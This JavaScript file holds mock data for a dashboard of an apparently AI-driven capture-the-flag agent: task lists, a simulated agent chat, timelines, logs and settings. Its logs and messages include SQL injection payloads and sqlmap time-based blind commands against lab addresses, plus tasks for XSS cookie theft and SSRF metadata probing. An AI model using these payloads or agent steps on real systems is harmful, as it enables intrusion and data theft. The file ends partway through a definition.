/* global React */
// ============================================================
// FlagHunter Mission Control — Mock data + simulation engine
// ============================================================

const NOW_BASE = Date.parse('2026-05-26T10:34:00+08:00');
const nowOffset = (sec) => new Date(NOW_BASE + sec * 1000).toISOString();
const hh = (iso) => {
  const d = new Date(iso);
  return d.toTimeString().slice(0, 8);
};
const hhmm = (iso) => {
  const d = new Date(iso);
  return d.toTimeString().slice(0, 5);
};
const since = (iso) => {
  const parsed = Date.parse(iso);
  if (Number.isNaN(parsed)) return '—';
  const diff = Math.max(0, (Date.now() - parsed) / 1000);
  if (diff < 60) return `${Math.round(diff)}s ago`;
  if (diff < 3600) return `${Math.round(diff/60)}m ago`;
  if (diff < 86400) return `${Math.round(diff/3600)}h ago`;
  return `${Math.round(diff/86400)}d ago`;
};
window.fmt = { hh, hhmm, since, nowOffset };

// ------------------------------------------------------------
// TASKS
// ------------------------------------------------------------
const TASKS = [
  {
    id: 'task_002', title: 'sqli probe / admin login form',
    target: 'http://10.10.20.45:8080/admin/login',
    goal: '获取 admin 账号或拿到 flag',
    status: 'running',
    detectedType: 'web',
    currentRunId: 'run_002',
    startedAt: nowOffset(-258),
    finishedAt: null,
    durationMs: null,
    tokensUsed: 18420,
    toolCalls: 9,
    success: null,
    finalFlag: null,
    stopReason: null,
    sparkSeed: [3, 6, 4, 8, 12, 9, 14, 18, 22, 19, 24, 28],
  },
  {
    id: 'task_001', title: 'wal_recover blind run',
    target: 'http://127.0.0.1:8765/challenges/wal_recover/',
    goal: '拿到 flag',
    status: 'success',
    detectedType: 'misc',
    currentRunId: 'run_001',
    startedAt: nowOffset(-2040),
    finishedAt: nowOffset(-2028),
    durationMs: 11_280,
    tokensUsed: 8_412,
    toolCalls: 3,
    success: true,
    finalFlag: 'flag{wal_recovery_works_2026}',
    stopReason: null,
    sparkSeed: [2, 4, 6, 5, 8, 11, 9, 13],
  },
  {
    id: 'task_003', title: 'JWT alg=none bypass attempt',
    target: 'http://10.10.20.51:3000/api/auth',
    goal: '绕过鉴权拿到 admin scope',
    status: 'failed',
    detectedType: 'web',
    currentRunId: 'run_003',
    startedAt: nowOffset(-3600),
    finishedAt: nowOffset(-3120),
    durationMs: 482_000,
    tokensUsed: 42_811,
    toolCalls: 17,
    success: false,
    finalFlag: null,
    stopReason: 'no_progress',
    sparkSeed: [4, 6, 8, 7, 5, 4, 3, 2, 2, 1],
  },
  {
    id: 'task_004', title: 'PNG LSB steganography hunt',
    target: 'attachments/glitch_card.png',
    goal: '从图片提取 flag',
    status: 'success',
    detectedType: 'misc',
    currentRunId: 'run_004',
    startedAt: nowOffset(-5400),
    finishedAt: nowOffset(-5278),
    durationMs: 122_400,
    tokensUsed: 12_984,
    toolCalls: 5,
    success: true,
    finalFlag: 'flag{lsb_is_loud_2026}',
    stopReason: null,
    sparkSeed: [3, 5, 7, 9, 8, 11, 14],
  },
  {
    id: 'task_005', title: 'reverse ELF flag check',
    target: 'attachments/check_me',
    goal: '逆向二进制并构造 flag',
    status: 'queued',
    detectedType: 'reverse',
    currentRunId: null,
    startedAt: null,
    finishedAt: null,
    durationMs: null,
    tokensUsed: 0,
    toolCalls: 0,
    success: null,
    finalFlag: null,
    stopReason: null,
    sparkSeed: [0, 0, 0, 0],
  },
  {
    id: 'task_006', title: 'stored XSS / feedback form',
    target: 'http://10.10.20.45:8080/feedback',
    goal: '触发 xss 上报 admin cookie',
    status: 'success',
    detectedType: 'web',
    currentRunId: 'run_006',
    startedAt: nowOffset(-9600),
    finishedAt: nowOffset(-9402),
    durationMs: 198_000,
    tokensUsed: 22_104,
    toolCalls: 11,
    success: true,
    finalFlag: 'flag{cookie_jar_open_2026}',
    stopReason: null,
    sparkSeed: [2, 4, 5, 4, 7, 9, 11, 10, 13, 15],
  },
  {
    id: 'task_007', title: 'ssrf cloud metadata probe',
    target: 'http://10.10.20.45:8080/preview?url=',
    goal: '探测云元数据接口',
    status: 'stopped',
    detectedType: 'web',
    currentRunId: 'run_007',
    startedAt: nowOffset(-14400),
    finishedAt: nowOffset(-14210),
    durationMs: 190_000,
    tokensUsed: 19_220,
    toolCalls: 13,
    success: null,
    finalFlag: null,
    stopReason: 'manual_stop',
    sparkSeed: [3, 4, 6, 5, 7, 8, 6, 5, 4],
  },
];

// ------------------------------------------------------------
// CONVERSATION for active task task_002
// ------------------------------------------------------------
const MESSAGES_002 = [
  { id: 'm1', role: 'user', t: nowOffset(-258),
    content: '开启 ctf 模式，自己判断题型并拿 flag。目标在 http://10.10.20.45:8080/admin/login。' },
  { id: 'm2', role: 'agent', t: nowOffset(-256),
    content: '收到。先做 recon —— 探测目标可达性、指纹与可见路径。',
    tools: ['terminal: curl -sI', 'terminal: nmap -sV -p 8080'] },
  { id: 'm3', role: 'agent', t: nowOffset(-242),
    content: 'recon 完成：nginx/1.25.3 反代 nodejs 后台，登录表单使用 POST application/json，疑似 postgres。指纹与 RAG 命中 "blind sqli on json bodies"。',
    code: 'POST /admin/login HTTP/1.1\nHost: 10.10.20.45:8080\nContent-Type: application/json\n\n{"username":"admin","password":"x"}' },
  { id: 'm4', role: 'agent', t: nowOffset(-228),
    content: '生成 hypothesis：用户名/密码字段未参数化，疑似可注入。选择策略 sql_injection_probe，先做轻量 payload 探测，避免直接上 sqlmap。' },
  { id: 'm5', role: 'system', t: nowOffset(-210),
    content: 'strategy switched → sql_injection_probe' },
  { id: 'm6', role: 'agent', t: nowOffset(-180),
    content: '尝试若干轻量 payload。username 字段在引号闭合时返回不同响应大小，疑似存在二阶过滤但未消毒 LIKE 子句。',
    code: 'username = admin\' --     → 401  (size 142)\nusername = admin\' OR 1=1 -- → 200 (size 318)  ← anomaly' },
  { id: 'm7', role: 'user', t: nowOffset(-150),
    content: '注意 backend 是 postgres，不是 mysql。pg_sleep 而不是 sleep。' },
  { id: 'm8', role: 'agent', t: nowOffset(-148),
    content: '已记录 hint：pg_sleep。回写 notes.target_db=postgres，并切换到 timing_based_blind 子策略。' },
  { id: 'm9', role: 'agent', t: nowOffset(-92),
    content: '运行 sqlmap，配置 --dbms=postgresql --technique=T，正在 enumerate users 表。',
    tools: ['terminal: sqlmap'] },
  { id: 'm10', role: 'system', t: nowOffset(-12),
    content: 'tool.running · terminal · sqlmap pid=18472 elapsed=00:01:18' },
];

// ------------------------------------------------------------
// PLAN / panel state for task_002
// ------------------------------------------------------------
const TASK_002_PANEL = {
  plan: [
    { id: 'p1', label: 'recon · 指纹与路径', state: 'done' },
    { id: 'p2', label: 'fingerprint · backend 识别', state: 'done' },
    { id: 'p3', label: 'probe · sqli 轻量探测', state: 'done' },
    { id: 'p4', label: 'exploit · timing-based blind', state: 'active' },
    { id: 'p5', label: 'exfil · dump users 表', state: 'todo' },
    { id: 'p6', label: 'verify · 登录或拿 flag', state: 'todo' },
  ],
  strategy: 'timing_based_blind',
  hypothesis: 'username 字段未参数化，postgres 后端，可用 pg_sleep 做盲注',
  tool: { name: 'terminal', args: 'sqlmap -u … --technique=T --dbms=postgresql', startedAt: nowOffset(-78) },
  detectedType: 'web',
  observations: [
    { id: 'o1', t: nowOffset(-242), text: 'reverse-proxy: nginx/1.25.3 → node express' },
    { id: 'o2', t: nowOffset(-228), text: 'json body endpoint accepts non-quoted usernames' },
    { id: 'o3', t: nowOffset(-180), text: 'response size delta on quote injection: 142 → 318' },
    { id: 'o4', t: nowOffset(-150), text: 'backend declared postgres (user hint)' },
    { id: 'o5', t: nowOffset(-92), text: 'sqlmap selected technique=T (time-based)' },
    { id: 'o6', t: nowOffset(-18), text: 'sleep delta confirmed @ payload offset 6' },
  ],
  knowledgeHits: [
    { id: 'kh1', title: 'Blind SQLi on JSON bodies', source: 'rag', score: 0.82, doc: 'doc_002' },
    { id: 'kh2', title: 'Postgres timing primitives', source: 'rag', score: 0.78, doc: 'doc_002' },
    { id: 'kh3', title: 'sqlmap recipes (json)', source: 'strategy_memory', score: 0.74, doc: 'doc_009' },
  ],
  notes: [
    { id: 'n1', key: 'target_db', value: 'postgres' },
    { id: 'n2', key: 'response_size_baseline', value: '142 bytes' },
    { id: 'n3', key: 'response_size_anomaly', value: '318 bytes' },
    { id: 'n4', key: 'injection_field', value: 'username' },
  ],
  artifacts: [
    { id: 'a1', name: 'curl_recon.txt', kind: 'file', size: '1.2 KB' },
    { id: 'a2', name: 'nmap_sv.xml', kind: 'file', size: '4.8 KB' },
    { id: 'a3', name: 'sqlmap_session/', kind: 'file', size: '… running' },
  ],
};

// ------------------------------------------------------------
// TRACES (timeline events for run_002 = active; run_001 = wal_recover)
// ------------------------------------------------------------
function ev(id, off, type, kind, title, summary, payload, status='done') {
  return {
    id, t: nowOffset(off), type, kind, title, summary, status, payload: payload || null,
    durationMs: payload?.durationMs ?? null,
    tokens: payload?.tokens ?? null,
    tool: payload?.tool ?? null,
  };
}

const TIMELINE_002 = [
  ev('e1', -258, 'task',       'task.started',         'task.started',                'detected ctf mode, target = http://10.10.20.45:8080/admin/login', { tokens: 0 }),
  ev('e2', -256, 'tool',       'tool.called',          'recon · curl -sI',            'fetch headers from /admin/login', { tool: 'terminal', durationMs: 410, tokens: 120 }),
  ev('e3', -254, 'tool',       'tool.finished',        'curl finished',               '200 OK · server: nginx/1.25.3 · x-powered-by: Express', { tool: 'terminal', durationMs: 410, tokens: 240 }),
  ev('e4', -250, 'tool',       'tool.called',          'recon · nmap -sV',            'scan service versions on :8080', { tool: 'terminal', durationMs: 7800, tokens: 320 }),
  ev('e5', -242, 'tool',       'tool.finished',        'nmap finished',               'open: 8080 http nginx 1.25.3 · 5432 closed', { tool: 'terminal', durationMs: 7800, tokens: 520 }),
  ev('e6', -240, 'plan',       'agent.plan.created',   'plan created',                '6 steps: recon → fingerprint → probe → exploit → exfil → verify', { tokens: 980 }),
  ev('e7', -236, 'knowledge',  'knowledge.retrieved',  'knowledge retrieved (3)',     'top hit: Blind SQLi on JSON bodies · score 0.82', { tokens: 760 }),
  ev('e8', -232, 'hypothesis', 'agent.hypothesis',     'hypothesis generated',        'username field unsanitized · backend likely postgres', { tokens: 880 }),
  ev('e9', -230, 'strategy',   'agent.strategy.selected', 'strategy: sql_injection_probe', 'matched on json body + uniform error pattern', { tokens: 420 }),
  ev('e10', -210,'tool',       'tool.called',          'probe payload set #1',        '6 payloads · quote-close / OR 1=1 / comment-strip', { tool: 'http_request', durationMs: 3210, tokens: 660 }),
  ev('e11', -204,'tool',       'tool.finished',        'probe completed',             'anomaly: 142→318 bytes on `OR 1=1 --`', { tool: 'http_request', durationMs: 3210, tokens: 840 }),
  ev('e12', -198,'note',       'note.created',         'note: response_size_anomaly', '318 bytes vs 142 baseline @ username field', { tokens: 80 }),
  ev('e13', -150,'system',     'hint.injected',        'user hint accepted',          '“注意 backend 是 postgres，pg_sleep 而不是 sleep”', { tokens: 60 }),
  ev('e14', -148,'note',       'note.created',         'note: target_db=postgres',    'recorded from user hint', { tokens: 40 }),
  ev('e15', -140,'strategy',   'agent.strategy.selected', 'strategy: timing_based_blind', 'switched from probe → timing-based exploit', { tokens: 320 }),
  ev('e16', -120,'knowledge',  'knowledge.retrieved',  'knowledge retrieved (2)',     'Postgres timing primitives · pg_sleep ladder', { tokens: 580 }),
  ev('e17', -92, 'tool',       'tool.called',          'sqlmap --dbms=postgresql -T', '--technique=T enumerate users', { tool: 'terminal', durationMs: 78000, tokens: 1240, running: true }),
  ev('e18', -78, 'system',     'runtime.command.started', 'runtime · sqlmap pid=18472', 'LocalRuntime spawned subprocess', { tokens: 0 }),
  ev('e19', -18, 'note',       'note.created',         'note: sleep delta confirmed', 'payload offset 6 yields > 4s response', { tokens: 90 }),
  // running event at the tip
  { id: 'e20', t: nowOffset(-2), type: 'tool', kind: 'tool.running', title: 'sqlmap enumerate users',
    summary: 'dumping pg_user · 12 rows so far', status: 'running',
    durationMs: null, tokens: 1820, tool: 'terminal',
    payload: { running: true } },
];

const TIMELINE_001 = [
  ev('w1', -2040, 'task',      'task.started',         'task.started',                'target = http://127.0.0.1:8765/challenges/wal_recover/', { tokens: 0 }),
  ev('w2', -2039, 'tool',      'tool.called',          'recon · directory listing',   'GET /challenges/wal_recover/', { tool: 'http_request', durationMs: 220, tokens: 80 }),
  ev('w3', -2038, 'tool',      'tool.finished',        'directory listing observed',  'app.db  app.db-wal  README.txt', { tool: 'http_request', durationMs: 220, tokens: 160 }),
  ev('w4', -2037, 'knowledge', 'knowledge.retrieved',  'knowledge retrieved (1)',     'SQLite WAL recovery notes · score 0.91', { tokens: 410 }),
  ev('w5', -2036, 'hypothesis','agent.hypothesis',     'hypothesis generated',        'flag likely flushed only into WAL, not main db', { tokens: 520 }),
  ev('w6', -2035, 'strategy',  'agent.strategy.selected', 'strategy: artifact_forensics', 'misc chain matched attachment surface', { tokens: 220 }),
  ev('w7', -2034, 'tool',      'tool.called',          'wget app.db & app.db-wal',    'download both files', { tool: 'terminal', durationMs: 1100, tokens: 180 }),
  ev('w8', -2033, 'tool',      'tool.finished',        'download finished',           '2 files · 41 KB total', { tool: 'terminal', durationMs: 1100, tokens: 200 }),
  ev('w9', -2032, 'artifact',  'artifact.created',     'app.db, app.db-wal',          'stored under run_001/artifacts/', { tokens: 0 }),
  ev('w10', -2031,'tool',      'tool.called',          'sqlite3 app.db .recover',     'attempt recovery to extract historical pages', { tool: 'terminal', durationMs: 480, tokens: 120 }),
  ev('w11', -2030,'tool',      'tool.finished',        '.recover dump done',          'dumped 1842 rows · flag candidate visible', { tool: 'terminal', durationMs: 480, tokens: 320 }),
  ev('w12', -2029,'note',      'note.created',         'note: flag present in WAL',   'commit boundary crossed before VACUUM', { tokens: 60 }),
  ev('w13', -2028,'verify',    'verifier.flag.candidate', 'flag candidate: flag{wal_recovery_works_2026}', 'matched format & checksum', { tokens: 40 }),
  ev('w14', -2028,'verify',    'verifier.flag.verified','flag verified ✓',             'task.finished · duration 11.28s', { tokens: 0 }),
];

const TRACES = [
  { id: 'run_002', taskId: 'task_002', target: 'http://10.10.20.45:8080/admin/login',
    status: 'running', startedAt: nowOffset(-258), finishedAt: null,
    durationMs: 258_000, totalSteps: 20, totalToolCalls: 9, totalTokens: 18420,
    inputTokens: 12_310, outputTokens: 6_110, finalFlag: null, timeline: TIMELINE_002 },
  { id: 'run_001', taskId: 'task_001', target: 'http://127.0.0.1:8765/challenges/wal_recover/',
    status: 'success', startedAt: nowOffset(-2040), finishedAt: nowOffset(-2028),
    durationMs: 11_280, totalSteps: 14, totalToolCalls: 3, totalTokens: 8412,
    inputTokens: 5_980, outputTokens: 2_432, finalFlag: 'flag{wal_recovery_works_2026}', timeline: TIMELINE_001 },
  { id: 'run_003', taskId: 'task_003', target: 'http://10.10.20.45:8080/api/auth',
    status: 'failed', startedAt: nowOffset(-3600), finishedAt: nowOffset(-3120),
    durationMs: 482_000, totalSteps: 28, totalToolCalls: 17, totalTokens: 42_811,
    inputTokens: 28_400, outputTokens: 14_411, finalFlag: null, timeline: null },
  { id: 'run_006', taskId: 'task_006', target: 'http://10.10.20.45:8080/feedback',
    status: 'success', startedAt: nowOffset(-9600), finishedAt: nowOffset(-9402),
    durationMs: 198_000, totalSteps: 22, totalToolCalls: 11, totalTokens: 22_104,
    inputTokens: 14_200, outputTokens: 7_904, finalFlag: 'flag{cookie_jar_open_2026}', timeline: null },
  { id: 'run_004', taskId: 'task_004', target: 'attachments/glitch_card.png',
    status: 'success', startedAt: nowOffset(-5400), finishedAt: nowOffset(-5278),
    durationMs: 122_400, totalSteps: 10, totalToolCalls: 5, totalTokens: 12_984,
    inputTokens: 7_200, outputTokens: 5_784, finalFlag: 'flag{lsb_is_loud_2026}', timeline: null },
  { id: 'run_007', taskId: 'task_007', target: 'http://10.10.20.45:8080/preview',
    status: 'stopped', startedAt: nowOffset(-14400), finishedAt: nowOffset(-14210),
    durationMs: 190_000, totalSteps: 18, totalToolCalls: 13, totalTokens: 19_220,
    inputTokens: 12_900, outputTokens: 6_320, finalFlag: null, timeline: null },
];

// ------------------------------------------------------------
// GRAPH for run_002 (DAG-ish layout)
// ------------------------------------------------------------
const GRAPH_002 = {
  nodes: [
    { id: 'g1',  x: 30,  y: 30,  kind: 'green',   k: 'TASK',      t: 'run_002 · started' },
    { id: 'g2',  x: 220, y: 30,  kind: 'cyan',    k: 'TOOL',      t: 'curl recon' },
    { id: 'g3',  x: 410, y: 30,  kind: 'cyan',    k: 'TOOL',      t: 'nmap -sV' },
    { id: 'g4',  x: 220, y: 110, kind: '',        k: 'PLAN',      t: '6 steps' },
    { id: 'g5',  x: 410, y: 110, kind: 'blue',    k: 'KNOWLEDGE', t: 'rag · 3 hits' },
    { id: 'g6',  x: 600, y: 70,  kind: 'magenta', k: 'HYPOTHESIS',t: 'json blind sqli' },
    { id: 'g7',  x: 600, y: 170, kind: 'magenta', k: 'STRATEGY',  t: 'sql_injection_probe' },
    { id: 'g8',  x: 410, y: 230, kind: 'cyan',    k: 'TOOL',      t: 'probe payload x6' },
    { id: 'g9',  x: 220, y: 230, kind: 'amber',   k: 'NOTE',      t: 'response anomaly' },
    { id: 'g10', x: 30,  y: 290, kind: '',        k: 'HINT',      t: 'user: postgres / pg_sleep' },
    { id: 'g11', x: 220, y: 320, kind: 'magenta', k: 'STRATEGY',  t: 'timing_based_blind' },
    { id: 'g12', x: 410, y: 320, kind: 'blue',    k: 'KNOWLEDGE', t: 'pg_sleep ladder' },
    { id: 'g13', x: 600, y: 290, kind: 'cyan',    k: 'TOOL',      t: 'sqlmap (running)' },
    { id: 'g14', x: 600, y: 380, kind: 'amber',   k: 'NOTE',      t: 'sleep delta @ off=6' },
  ],
  edges: [
    ['g1','g2'], ['g2','g3'], ['g3','g4'], ['g4','g5'],
    ['g5','g6'], ['g6','g7'], ['g7','g8'], ['g8','g9'],
    ['g10','g11'], ['g9','g11'], ['g11','g12'], ['g12','g13'],
    ['g13','g14'],
  ],
  active: [['g11','g12'], ['g12','g13']],
};

// ------------------------------------------------------------
// KNOWLEDGE DOCS
// ------------------------------------------------------------
const KNOWLEDGE = [
  { id: 'doc_002', title: 'Blind SQLi on JSON bodies', sourcePath: 'knowledge/web/blind_sqli_json.md',
    type: 'md', chunkCount: 14, updatedAt: nowOffset(-86400),
    lastHitAt: nowOffset(-236), hitCount: 38, tags: ['web', 'sqli', 'postgres'],
    summary: 'Approaches for blind injection when the parameter sits inside a JSON request body.' },
  { id: 'doc_001', title: 'SQLite WAL recovery notes', sourcePath: 'knowledge/forensics/sqlite_wal.md',
    type: 'md', chunkCount: 12, updatedAt: nowOffset(-172800),
    lastHitAt: nowOffset(-2037), hitCount: 17, tags: ['forensics', 'sqlite', 'wal'],
    summary: 'Common SQLite WAL recovery workflow: dumping historical frames before checkpoint.' },
  { id: 'doc_003', title: 'JWT alg=none / kid traversal', sourcePath: 'knowledge/web/jwt_alg_none.md',
    type: 'md', chunkCount: 9, updatedAt: nowOffset(-259200),
    lastHitAt: nowOffset(-3580), hitCount: 11, tags: ['web', 'jwt', 'auth'],
    summary: 'Bypass tactics on misconfigured JWT validators.' },
  { id: 'doc_004', title: 'PNG LSB steganography toolkit', sourcePath: 'knowledge/misc/png_lsb.md',
    type: 'md', chunkCount: 7, updatedAt: nowOffset(-432000),
    lastHitAt: nowOffset(-5392), hitCount: 6, tags: ['misc', 'stego', 'png'],
    summary: 'zsteg, stegsolve, pixel-level walkers and channel splitters.' },
  { id: 'doc_005', title: 'Common CTF flag formats', sourcePath: 'knowledge/meta/flag_formats.md',
    type: 'md', chunkCount: 4, updatedAt: nowOffset(-86400 * 14),
    lastHitAt: nowOffset(-2028), hitCount: 92, tags: ['meta', 'verify'],
    summary: 'Patterns the verifier uses to decide whether a candidate matches the expected flag shape.' },
  { id: 'doc_006', title: 'PHP unserialize → POP chain', sourcePath: 'knowledge/web/php_unserialize.md',
    type: 'md', chunkCount: 18, updatedAt: nowOffset(-86400 * 7),
    lastHitAt: nowOffset(-86400 * 2), hitCount: 4, tags: ['web', 'php', 'rce'],
    summary: 'Building POP chains against vendor libraries with autoload-friendly gadgets.' },
  { id: 'doc_007', title: 'SSRF cloud metadata cheatsheet', sourcePath: 'knowledge/web/ssrf_cloud.md',
    type: 'md', chunkCount: 11, updatedAt: nowOffset(-86400 * 3),
    lastHitAt: nowOffset(-14210), hitCount: 9, tags: ['web', 'ssrf', 'cloud'],
    summary: '169.254.169.254 routes per provider plus DNS rebinding fallbacks.' },
  { id: 'doc_008', title: 'Reverse ELF anti-debug primer', sourcePath: 'knowledge/reverse/elf_antidebug.md',
    type: 'md', chunkCount: 22, updatedAt: nowOffset(-86400 * 10),
    lastHitAt: nowOffset(-86400 * 4), hitCount: 3, tags: ['reverse', 'elf'],
    summary: 'Detecting and bypassing ptrace / TLS callbacks / timing checks.' },
  { id: 'doc_009', title: 'sqlmap recipes (json bodies)', sourcePath: 'knowledge/web/sqlmap_recipes.md',
    type: 'md', chunkCount: 6, updatedAt: nowOffset(-86400 * 2),
    lastHitAt: nowOffset(-120), hitCount: 21, tags: ['web', 'sqli', 'sqlmap'],
    summary: 'Working --data templates, --technique selection, and prefix/suffix tuning.' },
  { id: 'doc_010', title: 'nmap fast recon profiles', sourcePath: 'knowledge/recon/nmap.md',
    type: 'md', chunkCount: 8, updatedAt: nowOffset(-86400 * 21),
    lastHitAt: nowOffset(-250), hitCount: 64, tags: ['recon', 'nmap'],
    summary: 'Profiles balancing scan depth against blackbox stealth.' },
  { id: 'doc_011', title: 'XSS payload library', sourcePath: 'knowledge/web/xss_library.md',
    type: 'md', chunkCount: 16, updatedAt: nowOffset(-86400 * 5),
    lastHitAt: nowOffset(-9450), hitCount: 28, tags: ['web', 'xss'],
    summary: 'Polyglots, csp bypasses, hash-flag exfil templates.' },
  { id: 'doc_012', title: 'token budget heuristics', sourcePath: 'knowledge/meta/budget.md',
    type: 'md', chunkCount: 5, updatedAt: nowOffset(-86400 * 9),
    lastHitAt: nowOffset(-86400 * 1), hitCount: 14, tags: ['meta', 'budget'],
    summary: 'When to truncate observation feed vs. summarize via strategy memory.' },
];

const CHUNKS_002 = [
  { id: 'c001', idx: 0, hits: 5,
    text: 'When the injection point sits inside a JSON body, sqlmap requires --data with a placeholder. Use star marker on the field to test: { "username": "*", "password": "x" }. The handler likely parses JSON before reaching the query, so quote-escaping behaves more like a string parameter than a raw URL parameter.' },
  { id: 'c002', idx: 1, hits: 7,
    text: 'Detect backend dialect via timing: pg_sleep, SLEEP, WAITFOR DELAY differ. Postgres returns the same response shape for both authenticated and unauthenticated probes, so size deltas are the strongest signal.' },
  { id: 'c003', idx: 2, hits: 3,
    text: 'For blind extraction, prefer T (time-based) over B (boolean) when the application returns generic error pages. Watch for upstream caches that swallow timing differences.' },
  { id: 'c004', idx: 3, hits: 2,
    text: 'Chain knowledge: if you saw an anomaly at quote close but no error page, suspect a forgiving ORM (Sequelize, Knex) that swallows exceptions. Look for second-order injection in audit log writes.' },
  { id: 'c005', idx: 4, hits: 4,
    text: 'When the verifier rejects timing signals as noisy, switch to enumerating via UNION-injection on a known endpoint that reflects user input, even if it is a different route.' },
];

// ------------------------------------------------------------
// LOGS
// ------------------------------------------------------------
function mkLog(off, level, source, msg, runId='run_002', taskId='task_002') {
  return { id: `log_${Math.abs(off)}_${source}`, t: nowOffset(off), level, source, msg, runId, taskId };
}

const LOGS_BASE = [
  mkLog(-260, 'info',  'orchestrator',  'task task_002 accepted'),
  mkLog(-259, 'info',  'ctf_dispatcher','detected_type=web (confidence 0.84)'),
  mkLog(-258, 'info',  'runtime',       'LocalRuntime selected · workdir=/work/runs/run_002'),
  mkLog(-257, 'debug', 'token_tracker', 'input=120 output=240 cumulative=360'),
  mkLog(-256, 'info',  'tool.terminal', '$ curl -sI http://10.10.20.45:8080/admin/login'),
  mkLog(-254, 'info',  'tool.terminal', 'HTTP/1.1 200 OK · server: nginx/1.25.3'),
  mkLog(-250, 'info',  'tool.terminal', '$ nmap -sV -p 8080 10.10.20.45'),
  mkLog(-242, 'info',  'tool.terminal', '8080/tcp open  http  nginx 1.25.3'),
  mkLog(-240, 'info',  'agent.planner', 'plan saved: recon → fingerprint → probe → exploit → exfil → verify'),
  mkLog(-236, 'info',  'rag',           '3 hits · top: doc_002 score=0.82'),
  mkLog(-232, 'info',  'agent.hypothesis', 'generated · "username field unsanitized"'),
  mkLog(-230, 'info',  'agent.strategy',   'selected · sql_injection_probe'),
  mkLog(-218, 'debug', 'http_request',  'POST /admin/login {"username":"admin\' OR 1=1 --","password":"x"} → 200 (318 bytes)'),
  mkLog(-216, 'warn',  'verifier',      'no flag candidate found in response body'),
  mkLog(-204, 'info',  'agent.observer','anomaly detected: response_size 142→318'),
  mkLog(-198, 'info',  'notes',         'wrote note: response_size_anomaly'),
  mkLog(-180, 'debug', 'token_tracker', 'cumulative tokens=4820 / 500000'),
  mkLog(-150, 'info',  'orchestrator',  'user hint accepted: pg_sleep / postgres'),
  mkLog(-148, 'info',  'notes',         'wrote note: target_db=postgres'),
  mkLog(-140, 'info',  'agent.strategy','switched · timing_based_blind'),
  mkLog(-120, 'info',  'rag',           '2 hits · top: doc_002#c002 score=0.79'),
  mkLog(-92,  'info',  'tool.terminal', '$ sqlmap -u "http://10.10.20.45:8080/admin/login" --data ... --technique=T --dbms=postgresql'),
  mkLog(-90,  'debug', 'runtime',       'spawn pid=18472 cwd=/work/runs/run_002'),
  mkLog(-78,  'info',  'tool.terminal', 'sqlmap: testing connection to the target URL'),
  mkLog(-60,  'info',  'tool.terminal', 'sqlmap: heuristic (basic) test shows that POST parameter username might be injectable'),
  mkLog(-40,  'warn',  'tool.terminal', 'sqlmap: testing time-based blind queries  [INFO] confirmed pg_sleep response'),
  mkLog(-30,  'info',  'tool.terminal', 'sqlmap: testing for SQL injection on POST parameter username'),
  mkLog(-18,  'info',  'agent.observer','sleep delta confirmed @ payload offset 6 · Δ=4.2s'),
  mkLog(-12,  'debug', 'token_tracker', 'cumulative tokens=18420 / 500000'),
  mkLog(-7,   'info',  'tool.terminal', 'sqlmap: fetching current user'),
  mkLog(-2,   'info',  'tool.terminal', 'sqlmap: enumerating tables in database "appdb"'),
];

// historical noise (older runs)
const LOGS_OLDER = [
  mkLog(-2040, 'info', 'orchestrator', 'task task_001 accepted', 'run_001', 'task_001'),
  mkLog(-2037, 'info', 'rag', '1 hit · doc_001 score=0.91', 'run_001', 'task_001'),
  mkLog(-2032, 'info', 'artifacts', 'stored 2 files · 41 KB', 'run_001', 'task_001'),
  mkLog(-2028, 'info', 'verifier', 'flag verified ✓ flag{wal_recovery_works_2026}', 'run_001', 'task_001'),
  mkLog(-3200, 'error', 'tool.http_request', 'JWT alg=none rejected by server · 401 unauthorized', 'run_003', 'task_003'),
  mkLog(-3150, 'error', 'agent.recovery', 'no_progress · stopping run_003', 'run_003', 'task_003'),
  mkLog(-9420, 'info', 'verifier', 'flag verified ✓ flag{cookie_jar_open_2026}', 'run_006', 'task_006'),
];

const LOGS = [...LOGS_OLDER, ...LOGS_BASE];

// ------------------------------------------------------------
// SETTINGS
// ------------------------------------------------------------
const SETTINGS = {
  model: {
    provider: 'su8.codes',
    apiBase: 'https://api.su8.codes/v1',
    name: 'claude-sonnet-4-5',
    temperature: 0.2,
    maxTokens: 128000,
    apiKey: 'sk-ant-•••••••••••••••••••',
    streaming: true,
  },
  runtime: {
    mode: 'local',
    autoSsh: false,
    dockerEnabled: false,
    sshConfigured: true,
    workdir: '/work/runs',
    sandboxNetwork: 'host',
  },
  mcp: {
    enabled: true,
    servers: ['fs-readonly', 'terminal', 'http-fetch', 'sqlite'],
    timeoutMs: 30000,
  },
  knowledge: {
    enabled: true,
    chunkSize: 1000,
    overlap: 200,
    threshold: 0.35,
    embeddingModel: 'voyage-3-large',
  },
  budget: {
    dailyTokenLimit: 500_000,
    dailyCostLimit: 50,
    perTaskTokenLimit: 80_000,
    alertAt: 0.8,
  },
  audit: {
    persistToolIO: true,
    persistObservations: true,
    redactSecrets: true,
    retentionDays: 30,
  },
  ctf: {
    enabled: true,
    maxIterations: 30,
    autoRetry: 2,
    flagFormat: 'flag\\{[^}]+\\}',
    hintPolicy: 'manual',
    hypothesisDepth: 3,
    strategyMemory: true,
    verifierUrl: '',
  },
};

// ------------------------------------------------------------
// DASHBOARD KPIs / charts / activity
// ------------------------------------------------------------
const DASHBOARD = {
  kpis: {
    running: 1,
    queued: 1,
    tasksToday: 14,
    successToday: 9,
    failedToday: 3,
    stoppedToday: 2,
    dailyTokens: 184_120,
    estimatedCost: 8.42,
    avgDurationSec: 142,
    successRate: 0.71,
    toolCalls: 186,
    knowledgeHits: 37,
  },
  tokenSeries: [
    { t: '08:00', v: 4200 }, { t: '09:00', v: 9800 }, { t: '10:00', v: 14_300 },
    { t: '11:00', v: 22_400 }, { t: '12:00', v: 18_100 }, { t: '13:00', v: 26_900 },
    { t: '14:00', v: 31_400 }, { t: '15:00', v: 28_900 }, { t: '16:00', v: 24_120 },
    { t: '17:00', v: 18_200 }, { t: '18:00', v: 12_300 }, { t: 'now', v: 6_700 },
  ],
  toolDistribution: [
    { name: 'terminal',     value: 78 },
    { name: 'http_request', value: 46 },
    { name: 'browser',      value: 22 },
    { name: 'file_io',      value: 18 },
    { name: 'sqlite',       value: 12 },
    { name: 'python_eval',  value: 10 },
  ],
  failureDistribution: [
    { name: 'no_progress',   value: 4, color: 'var(--red)' },
    { name: 'missing_tool',  value: 2, color: 'var(--amber)' },
    { name: 'budget_capped', value: 2, color: 'var(--magenta)' },
    { name: 'verifier_reject', value: 1, color: 'var(--cyan)' },
  ],
  knowledgeHitTrend: [
    { t: '08:00', v: 1 }, { t: '09:00', v: 3 }, { t: '10:00', v: 4 },
    { t: '11:00', v: 6 }, { t: '12:00', v: 3 }, { t: '13:00', v: 5 },
